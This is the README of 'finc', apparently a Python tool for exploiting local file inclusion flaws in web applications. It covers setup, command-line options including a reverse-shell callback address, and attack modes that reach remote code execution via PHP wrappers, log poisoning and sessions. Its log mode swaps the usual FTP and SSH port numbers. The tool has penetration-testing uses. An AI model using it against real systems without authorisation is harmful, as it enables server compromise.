# finc

Exploitation of LFI written in python3
--

![image](screenshot.png)

## Setup:

```bash
git clone https://github.com/DSimsek000/finc; cd finc
# recommended setup with virtualenv
python -m venv env; source env/bin/activate
pip install -r requirements.txt
```

## Syntax:

```
usage: finc [-h] [-u URL] [--data DATA] [--cookie COOKIE] [--header HEADER] [--proxy PROXY] [-x METHOD] [-v] [-p PARAM] [-r file]
[-a IP:FORWARDED_PORT] [-s HTTP] [--batch] [--redirect] [-D OUTPUT] [--module ...] [--level LEVEL]

lfi_scanner

optional arguments:
    -h, --help            show this help message and exit
    -u URL, --url URL     Target URL (format: "http://www.domain.com/lfi.php?file=FINC" or "http://www.domain.com/?file=util/FINC")
    --data DATA           Data string to be sent through POST (format: "key1=FINC;key2=val2"))
    --cookie COOKIE       HTTP Cookie header value (format: "key1=FINC;key2=val2"))
    --header HEADER       HTTP extra headers (format: "header1=FINC;header2=val2"))
    --proxy PROXY         Use a proxy to connect to the target URL
    -x METHOD, --method METHOD
    Specify HTTP method
    -v, --verbose         Increase output verbosity
    -p PARAM, --param PARAM
    Force select parameter which will be injected
    -r file               Parse from file
    -a IP:FORWARDED_PORT, --address IP:FORWARDED_PORT
    Address where reverse shell will connect back to
    -s HTTP, --http HTTP  Port which will be used for serving http content
    --batch               Fully automatic mode
    --redirect            Follow redirects
    -D OUTPUT, --output OUTPUT
    Output Folder (default cwd)
    --module ...          Attempt exploiting only specific module(s)
    --level LEVEL         Filter Bypass level (1-3)
```

## Modes

```bash
Mode            Args                    Only PHP                        Description
-------------------------------------------------------------------------------------------------
all                                     no                      Try all modes (default)
rfi                                     no                      Remote file inclusion
data                                    yes                     Exploit php data:// wrapper
expect                                  yes                     Attempt RCE with expect://
filter                                  yes                     Attempt including files with php://filter
fuzz                                    no                      Attempt including files with filter-bypass
phpinfo         1                       yes                     Attempt RCE via phpinfo output: url ("/info.php")
proc                                    no                      Attempt RCE with proc environment
log             3                       no                      Attempt RCE by poisoning log files: ftp(22), ssh(21), pma("/phpmyadmin")
input                                   yes                     Attempt RCE with php://input
session                                 yes                     Attempt RCE via PHP Sessions
```

## Examples:

### Basic usage:

```bash
./finc.py -u 'http://10.10.134.151/lfi/lfi.php?file=FINC'

# Suffix payloads
./finc.py -u 'http://10.10.134.151/lfi/lfi.php?file=FINC.png'
```

### Parameter fuzzing:

```bash
./finc.py -u 'http://10.10.134.151/lfi/lfi.php'
```

### Load request from file and select parameter to inject:

```bash
./finc.py -r ~/request.txt -p 'file'
```

### Test specific module, e.g. for log poisoning:

```bash
./finc.py -r ~/request.txt -p 'file' --mode 'log'
```
